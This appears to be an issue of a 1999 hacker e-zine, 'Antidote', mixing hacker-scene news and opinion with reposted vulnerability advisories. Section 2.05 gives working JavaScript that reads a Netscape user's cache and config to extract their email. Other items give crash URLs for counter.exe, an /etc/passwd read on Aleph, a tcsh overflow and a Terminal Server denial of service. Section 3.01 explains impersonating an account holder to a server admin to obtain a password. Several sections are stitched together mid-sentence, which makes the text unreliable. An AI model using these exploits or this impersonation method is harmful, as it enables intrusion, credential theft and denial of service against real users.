0.01 --=\\What?\\=--

    What is 'Antidote'? Well, we wouldn't say that Antidote is a hacking magazine, cause
    that would be wrong. We don't claim to be a hacking magazine. All Antidote is, is
    basically current news and happenings in the underground world. We aren't going to teach
    you how to hack or anything, but we will supply you with the current information and
    exploits. Mainly Antidote is just a magazine for people to read if they have some extra
    time on there hands and are bored with nothing to do. If you want to read a magazine
    that teaches you how to hack etc, then you might want to go to your local bookstore and
    see if they carry '2600'.

   ------------------------------


0.02 --=\\FAQ\\=--

    Here are a lot of questions that we seem to recieve a lot, or our "Frequently Asked
    Questions". Please read this before e-mailing us with questions and if the question
    isn't on here or doesn't make sense, then you can e-mail us with your question.

    > What exactly is "Antidote"?
      See section 0.01 for a complete description.	
	
    > I find Antidote to not be shot for the beginner or does not teach you the basics,
    why is that?
      Antidote is for everyone, all we are basically is a news ezine that comes out once
      a week with the current news, exploits, flaws and even programming. All of the
      articles that are in here are recieved second hand (sent to us) and we very rarely
      edit anyone's articles.

    > I just found Antidote issues on your webpage, is there anyway I can get them sent
    to me through e-mail?
      Yes, if you go to www.thepoison.org/antidote there should be a text box where you can
      input your e-mail address. You will recieve a link to the current Antidote (where you
      can view it).

    > If I want to submit something, are there any 'rules'?
      Please see section 0.03 for a complete description.
	
    > If I submitted something, can I remain anonymous?
      Yes. Just make sure that you specify what information about yourself you would like to
      be published above your article (when sending it to us) and we will do what you say.

    > I submitted something and I didn't see it in the current/last issue, why is that?
      It could be that someone else wrote something similar to what you wrote and they sent
      it to us first. If you sent us something and we didn't e-mail you back, then you might
      want to send it again because we probably didn't get it (we respond to all e-mails no
      matter what). We might use your article in future issues off Antidote.

    > Can I submit something that I didn't "discover" or "write"?
      Yes you can, we take information that is written by anyone regardless if you wrote it
      or not.

    Well thats it for our FAQ. If you have a question that is not on here or the question is
    on here and you had trouble understanding it, then please feel free to e-mail
    lordoak@thepoison.org and he will answer your question. This FAQ will probably be
    updated every month.

0.03 --=\\Shouts\\=--

    These are just some shout outs that we feel we owe to some people. Some are individuals
    and Some are groups in general. If you are not on this list and you feel that For some
    reason you should be, then please contact Lord Oak and he will post you on here and we
    are sorry for the Misunderstanding. Well, here are the shout outs:

    Like we said above, if we forgot you and/or you think you should be added, please e-mail
    lordoak@thepoison.org and he will be sure to add you.

   ------------------------------


0.04 --=\\Writing\\=--

    As many of you know, we are always open to articles/submittings. We will take almost
    anything that has to do with computer security. This leaves you open for:

	-Protecting the system (security/securing)
	-Attacking the system (hacking, exploits, flaws, etc....)
	-UNIX (really anything to do with it...)
	-News that has to do with any of the above....

    The only thing that we really don't take is webpage hacks, like e-mailing us and saying
    "www.xxx.com" was hacked... But if you have an opinion about the hacks that is fine. If
    you have any questions about what is "acceptable" and not, please feel free to e-mail
    Lord Oak [lordoak@thepoison.org] with your question and he will answer it. Also, please
    note that if we recieve two e-mails with the same topic/idea then we will use the one
    that we recieved first. So it might be a good idea to e-mail one of us and ask us if
    someone has written about/on this topic so that way you don't waste your time on writing
    something that won't be published. An example of this would be:

	If Joe sends me an e-mail with the topic being on hacking hotmail accounts on
	thursday.
	And then Bill sends us an e-mail on hacking hotmail accounts on sunday, we will
	take Joe's article because he sent it in first.

    But keep in mind, we might use your article for the next issue! If you have something
    that you would like to submit to Antidote, please e-mail lordoak@thepoison.org or
    duece@thepoison.org  and one of us will review the article and put it in Antidote (if we
    like it).

1.02 --=\\Bombs on the Net\\=--

    Well, as many people already know, bomb making webpages will be taken off of the
    internet. They have always tried to make "bomb making on the internet" illegal, but
    finally this Littleton incident happened and that made the final decision.

    This law can never be fully enforced due to the large ammounts of webpages there are.
    there is OVER 20,000,000 webpages (personal and bussiness) in wich around .8-9 million
    have something to do with anarchy or bomb related. Not nesacarly webpages dedicated to
    bomb making, but have maybe ONE recipe on how to make a bomb, but the webpage has other
    content on it.

    There are also ways around it. We all know the Anarchy Cookbook is sold in stores and
    they have the write to publish it because of "Freedom of Press" and speech. Well,
    technically you could buy that book and type EVERYTHING that is in that book and put it
    on the internet and it would be legal. The most important part is the Copyright.
    Obviously you would have to get permission from the Author to do this because of copy-
    right laws. If he approves it, then you could do it and it would be legal.

    This is a little off of the subject of bomb making, but it fits into the catagory
    "freedom of speech" and press. If you have noticed, both of those laws are starting to
    fade out little by little. First it  was cigarettes. You are not allowed to have T.V.,
    bilboard, and now they are trying to enforce magazine ads on cigarettes too. Now it is
    things with the internet. Next it will be violence and maybe even swearing because it
    "infulences" kids to have a bad mouth. To me, if they are going to take away these
    things, then they should take away some things like that also.

    If you think about, almost everytime a "law" like this is taken away, it is because of
    a current issue that happened in the U.S. So, basically they are taking away our civil
    rights becaues of things that we do for a punishment and not just because they feel
    like it (not necessarly a punishment, just forf safety etc...).

1.03 --=\\Government Issues\\=--
   
    [www.msnbc.com]

    THE FBI and Senate Web sites remained inaccessible Friday as a result of the
    computer attacks. The FBI shut down its Web site Wednesday after it was swamped by a
    denial-of-service attack. The Senate took its site offline Thursday night after attack-
    ers broke into the public computer server and replaced the congressional body’s home
    page with a screed against the FBI. The hacked page claimed credit on behalf of a group
    known as the Masters of Downloading, or M0D  and denigrated the FBI as well as Global
    Hell. The FBI may be all over the other groups like ... gH and tK. ... M0D make those
    morons look like a group of special-ed students! FBI vs. M0D in ’99, bring it on! read
    the page, which was peppered with ruder comments and hacker lingo.

    The intrusion compromised our Senate Internet Web site, and as a result the Senate has
    taken down our Web page to do some investigation, said Sherry Little, a spokeswoman for
    the Senate sergeant-at-arms, who manages the site. She said FBI agents were heading up
    the investigation.
    
    They’re looking at the criminal aspects of it, she told MSNBC. They’re in charge of
    the investigation, in that they’re trying to determine where it came from and whether
    there was any connection at all to any incidents that they’ve explored in the past. The
    Web outage rendered the official home pages of all 100 senators and senatorial commit-
    tees inaccessible, but e-mail and other computer services not related to the public Web
    site were unaffected, Little said. System administrators for the FBI and the Senate Web
    sites were beefing up site security during the down time and no one could say exactly
    when the sites would be returned to service. We’re not expecting this to be a long-term
    problem, Little said.

    The FBI was continuing its investigation into the attack on its own Web site, said Dave
    Miller, a media representative at the bureau’s national office. He confirmed that this
    could result in criminal penalties. Although he declined to provide specifics on the
    investigation, Miller told MSNBC that it would be a logical point that the FBI would
    look for connections to past attacks on federal Web sites. Earlier this month, Global
    Hell was implicated in attacks on a variety of U.S. government sites, including sites
    for the White House, several Cabinet departments and the U.S. Information Agency. Last
    week, Global Hell member Eric Burns (who also goes by the name Zyklon), was arrested in
    connection with three attacks on government computers. Members of Global Hell reported
    that law-enforcement officials served search warrants early Wednesday in Seattle,
    Houston and California.

    In Houston, FBI spokesman Rolando Moss told MSNBC that agents were investigating
    allegations of computer intrusions involving a teen-ager who uses the hacker handle 
    Mosthated. He said the investigation was continuing and declined further comment. In
    telephone conversations with MSNBC, Mosthated said that his home was raided at about
    6 a.m. CT Wednesday, and that family computer equipment was confiscated. He said his
    parents were really mad. ... The computer had all their financial information and stuff
    on it. Mosthated’s mother got on the line to read from the FBI’s receipt for the
    equipment and confirm that she was really mad. Mosthated said at least eight other
    people around the country had been served with search warrants as part of a huge hacker
    crackdown. Four other Houston-area hackers, three in California and one in Seattle
    reportedly received FBI visits. None was arrested, but all had computer equipment
    confiscated, he said. An FBI representative in San Diego said she could not comment on
    the investigation because the paperwork was sealed. Inquiries with the bureau’s Seattle
    office met with a similar response: Right now there are still things that need to be
    decided, one agent told MSNBC on condition of anonymity.

2.01 --=\\counter_exe.dos.txt\\=--

    A denial of service exists in counter.exe version 2.70, a fairly popular
    webhit counter used on the Win32 platform with web servers such as IIS and
    WebSite Pro. There are two different bugs:

    1) When someone requests :
    http://no-such-server-really/scripts/counter.exe?%0A this will create an
    entry in counter.log of a blank line then a ",1" . If the person then
    refreshes their browser and requests it again you get an Access Violation in
    counter.exe - the instruction at 0x00414c0a referenced memory at 0x00000000.

    2) When someone requests:
    http://no-such-server-really/scripts/counter.exe?AAAAAover-2200-As you get a
    similar problem - though not a buffer overrun.

    Whilst in a state of "hanging" all other vaild requests for counter are
    queued and not dealt with until someone goes to the console and okays the AV
    messages. Added to this memory can be consumed if the page is continuosly
    requested.

    I mailed the author twice about this but as I have received no response I
    have nothing left to do but send this on.

2.02 --=\\exlibris.alpeh.webserver.txt\\=--

    We have found a security hole in web server bundled with Aleph librarian
    system ver. 3.25 and higher (ExLibris). The web server in its default
    configuration allows anybody to view any file in the system the aleph
    instalation owner can access.

    It it very simple to grab for example /etc/passwd file from Aleph web
    server.

    The bug with all details was already posted to ExLibris
    and to some groups of Aleph users.

    Workaround:

    1) do not run web server as root at any circumstance!
    2) use /etc/shadow or similar system
    3) use tcpd wrappers for denying possible logins
    4) watch logs from web server

    Please spread this message to Aleph admins!

2.03 --=\\alibaba2_0.genkey.txt\\=--

    Some time ago, I downloaded a trial version of an SSL web server product for
    Windows NT called 'Alibaba 2.0' for evaluation as a possible SSL solution. I
    eventually made a decision to use another product, but I ended up using an
    RSA key pair generated by Alibaba's 'genkey' utility (which is based on the
    popular SSLeay toolkit).

    Whilst recently examining the keys generated by 'genkey' using tools shipped
    as part of the SSLeay distribution, I discovered what I believe to be a
    serious flaw:-

    The 'genkey' utility erroneously generates a private key with an exponent of
    '1'. This results in null security since the RSA public key associated with
    a private exponent of '1' is also '1', with the effect that the session key
    for each SSL session to a server running 'Alibaba' is sent in the clear.

    The result of this vulnerability is that 'secure' web sites that use keys
    generated by the 'genkey' utility provided with Alibaba 2.0 do not provide
    any security. Such sites are susceptible to having their transactions
    snooped by a third party, or falsified by man-in-the-middle attacks.

    A further interesting discovery is that both Netscape Navigator and Internet
    Explorer will happily let the user interact with SSL web sites which have an
    RSA public key exponent of '1' without bringing the user's attention to the

    File system full in %systemdrive% in Terminal Server can easily be
    reached by an ordinary user by growing
    his own  profile so denying the logon to all roaming profiles users who
    don't have locally cached stored copy of their own profile.

    (Such result can also be reached by growing   D:\temp dir, but you can
    prevent that modifing TEMP and TMP through
    system policies or modifing TEMP and TMP ntuser.dat hive
    HKCU\environment values.)

    Quota profile in SP4 are not effective to prevent growing of user
    profile, and so %systemdrive% can't be protected
    >from growing, and logon for roaming user can be denied by anyone.

    The profile quota in SP4 is supposed to give to administrators the
    ability to
    deny, through system policies, the ability to log off to any user who
    exceeds a specified quota until
    he/she make profile below the estabilshed quota.

    In fact article Q185561  says:

    << Remember that the user will not be able to log off if the user
    profile quota is exceeded. >>

    But the user can still log off exceeding the quota, if he kills his own
    process proquota.exe.
    *He* is the owner of the proquota.exe process, and not the system.
    It's very simple to do, unless the task manager is disabled  through
    system policies too.

    I tried this in NT Terminal Server edition.

    The problem in Terminal Server may be seriuos because in case of a
    system full on %systemdrive% drive (wich
    stores the locally cached copies of actually logged users profiles)  the
    logon will be denied to everyone who doesn't
    have locally cached copy of his own user profile (virtually all roaming
    profiles, if deleting locally stored cached copy of
    user profiles policy is applied).

    Nevertheless such kind of problems still remains if there will be simply
    changed the  proquota.exe process security environment from
    user to system, because it comes up only in logoff.

    So I think Sp4 quota profiles through system policies is not so
    effective to solve profiles quota and security related
    problems in NT, and specially in NT Terminal Server Edition.

2.05 --=\\netscape.title_tag.txt\\=--

    There is a security bug in Netscape Communicator 4.6 Win95, 4.07 Linux (guess all 4.x
    versions are affected) in the way they treat JavaScript code in the title of the
    document.
    
    One may embed JavaScript code in the TITLE tag. If the info about the document is shown,
    then the JavaScript code is executed. The info about the document may be infoked by a
    script using 'location="wysiwyg://1/about:document"'. The problem is that the JavaScript
    code is executed in the security context of the "about:" protocol. This allows accessing
    documents in the "about:" protocol such as: "about:cache", "about:config",
    "about:global", etc.

    Vulnerabilities:
     *Reading user's cache and accessing information such as passwords, credit card numbers.
     *Reading info about the Netscape's configuration ("about:config").
    This includes finding user's email address, mail servers, the encoded mail password (it
    must me saved and may be decoded). This allows reading user's email. The more dangerous
    part is that this vulnerability MAY BE EXPLOITED USING HTML MAIL MESSAGE.

    Workaround: Disable JavaScript

    Code:

    <HTML>
    <HEAD>
    <TITLE>
    <SCRIPT>

    a=window.open('wysiwyg://1/about:cache');
    s='Here are some links in your cache: \n';
    for(i=0;i<7;i++)
     s += a.document.links[i] + '\n'; 
    a.close();
    alert(s);


    a=window.open('wysiwyg://1/about:config');

    mag='mail.identity.useremail = ';
    mend='general.title_tips';
    res=mag;
    charstoread=20;

    alert('Will try to find your email. May take some time.');

    function readit() {
    for(i=0;i<charstoread;i++) {
     t=res;
     a.find(mend);
     for(c=1;c<256;c++) {
       t=res + String.fromCharCode(c);

         if (a.find(t,true,true)) {
    /*      alert(c); */
          res=t;
         } 
     }
    }
    res=res.substring(mag.length);
    a.close();
    alert("Your email is :\n" + res);
    }

    setTimeout("readit()",3000);

    While few days ago there was discussion about bash overflow on bugtraq i
    found another overflow in tcsh-6.07.09-1 [ rh 5.2 ].
    The problem is in too long $HOME evironment variable [ very old thing -
    zgv overflow ]. I don't know if it's a dangerous problem, but like someone
    said this shell can be used in some kind of script with SUID, etc.

    example:
    $ HOME=AAAAAAAAAAAAAAA...AAA
    $ export HOME
    $ tcsh

3.01 --=\\Social Engineering\\=--

    What is Social Engineering?
    Basically, social engineering is the art and science of getting people to do what you
    want them to do. It will not allow you to get people to perform tasks they whould never
    do.Social engineering can involve a lot of 'groundwork', information gathering and idle
    chit chat before an attempt at gaining information is ever made. Like hacking, most of
    the work is in the preparation, rather than the attempt itself.

    Methods:
    The First is the most obvious you just ask for what you want although this usually never
    works it still doesn't hurt to try :) The next method whould be getting all the info
    about what you want to do where they are located who they are email address etc.. here
    is an example. Ok say you want to get an account on a server well first you need to get
    all the info you can possible you need to find someone that has an account on the server
    and you want to get ALL the info on that person his email address real name where he
    lives the more info the better then you email the admin of that server requesting the
    username or passwd to your the person your trying to mimic it's as simple as that.

3.02 --=\\Newbie Ethnics\\=--

    This is the first article I am writing and as such an occasion I decided to write about
    my favorite topic which is computer hacking. Now this is not to be confused with system
    cracking which of course is the act of mindlessly breaking into systems, spreading
    viruses, and doing things which hurt innocent people who just don't know anything about
    the world of sercurity. I guess being a native New Yorker I am born with the sence of
    susipicion and a want of sercurity. Well let me get to the point of this article. It is
    meant to show all those who call themselves hackers a thing of two. I will guess that
    only half the people who read this paper will actually amount to being a real hacker.
    Well without further delay here is a paper on what a hacker really is. 

    eLLitE DoOdZ 

    All you newbies who are entering the wonderful world of hacking, I bet you looked into
    hacking because you want to be one of those "ellite" hackers in the movies right. Let me
    tell you something right now you will most likely never be one of the James Bond evil
    geniuses who crack into sensitive military information. Now I don't say this to mean
    that you aren't intelligent enough,it is simply not possible. It is a rare occasion that
    someone actually can break into any system that has sensitive information and not be
    caught. I've heard of less than a half dozen times when this rare occasion occurs.
    Getting caught is all most inevitable. Even those who have years of experience in
    sercurity and programming would have a great task ahead of them for a mission like that.
    Now those so called "cool techno wiz kids" also have boasted about hacking peoples
    accounts at school right? Well heres a word to the wise, its probally not as good as it
    sounds. And even if they are I'll give you nine to five odds they used some lame program
    of the internet to complete it. If they were for real they wouldn't ever admitted they
    done it all over school. So my message is if you want to be some kind of "Super Hacker"
    rent a movie and make it "A blockbuster night" because your dreaming. Face it your a
    newbie and you have to learn the basics before you do anything to impress your freinds.
    If you can stand the wait you'll have the reap the rewards of hacking and how cool it
    can be. 

    Progz 

    In the last paragraph I just skimmed over programs. Now the reason I downplay programs
    is the simple fact unless you wrote the program its not hacking. Any idiot can run a
    program ( I hope!). If you start using programs that do everything for you than what are
    you learning. I once read somewhere on one of the hundreds of hacking sites I've visited
    that "Hacking is using your knowledge to gain more knowledge". Now I've spent hours
    thinking about that and I'll tell you right now that is the best definition I've ever
    heard. Now please do not misunderstand what I'm saying. There are select number of
    programs that are good to have on hand for automating certain tasks. Now if you wanted
    to find out about the open ports on a computer you have to options. You can run a port
    surfer or check by hand. Now I almost never use a port surfer because it can cause you
    problems with your isp as well as not give you all the critical information you need. If
    your pressed for time in a wargame with a freinds server or something well than go ahead
    and use that program. I'll be honest with you's I keep programs on hand. I have a unix
    password cracker, port surfer, and even a mailbomber (which I use with much discretion
    and if you have half a brain you will too). And even keep a disk with a few of those
    intresting programs that are nice to have. Be wary of programs they are a crutch which
    you will become permanently attached to if your not careful. 

    Newbie tip section 

    Now if you are a intermediate hacker or above you can skip this section. Read if you
    like though. This goes out in response to the constant stream of newbies out there who
    prowl the chat rooms and newsgroups looking for intelligent people and sucking every bit
    of patience out of them. I can not even count the amount of newbies who have contacted
    me with questions like "Please teach me to hack?"or the infamous "How do I hack?". If
    you have any pride or brains you will never say these words in a chat room, newsgroup,
    or any other medium of the sort. I can not begin to tell you how irritating it is to be
    asked dumb questions over and over and over again. Day after day, month after month. I
    know that being new to anything is hard but if you persist in doing things like that you
    will inevitablely learn the true meaning of a flame. But I know you're all wondering how
    do I find out how to hack then? You use a ****ing search engine! Look up things like
    "hacking" and "computer sercurity".If you want to chat with other hackers ask specific
    questions like "Anyone know some good URL's". I'll tell you right now for the time I've
    been into hacking I've foung the best hacking sites right from people in the chat rooms.
    Not to mention if you find a good site be sure to share with others. I'm sure it will be
    greatly appreciated. 

    So what is real hacking anyway? 

    Well I've told what hacking is not. Now lets talk about what it is. Hacking, as I said
    before, is using your knowledge to expand your knowledge. Now that means you should
    become familiar with the various operating systems on the internet which are UNIX and
    WINDOWS NT. Port surfing computers is another very honorable way of hacking. You
    wouldn't believe how many things can be learned by port surfing the various protocols
    you'll come across. Even if criminal hackers port surf to learn as much about a system
    as possible. This is because of the golden rule of breaking a sysytem. YOU CAN NOT BREAK
    INTO A SYSTEM THAT YOU DON"T UNDERSTAND. Now of course if you are guessing passwords you
    may get in. But what will you do once your inside. After you know how to use various
    systems the next step is programming which I recently started. Well thats enough for
    now. Remember what a hacker is at all times. Lastly look for the Guide to Mostly
    Harmless Hacking written by Carolyn Meinel.

    As most of us have seen lately on the news is a bunch of "hackers" getting caught, well,
    it seems as though hackers are getting on the governments nerves. Well, they always have
    been, but now they are acctually arresting large ammounts of people. Maybe it is because
    there has been hacking in: senate.gov, whitehouse.gov, and fbi.gov (no real proof on
    that one, but there are rumors). If you went to HNN this week, you would have seen the
    fallowing issues about people getting caught:

    FBI Raids Suspect Crackers
    Five Busted in Florida
    Zyklon Busted
    IronLungs Raided
    Analyzer Cohorts to Testify Against Him
   
    And a while ago there was : S C R E A M Caught.

    I have never seen anything like this in such a short period of time, even a lot of
    members from gH got arrested and are in jail right now. The government is now out to
    get us more then they are Randolf (pretty much)(Randolf is the guy that did the Olympic
    bombings and has been on the most wanted list for about 2 years.). Think about it, they
    are looking for hackers and they are looking for Randolph, but they pretty much gave up
    on him and are just looking for hackers.
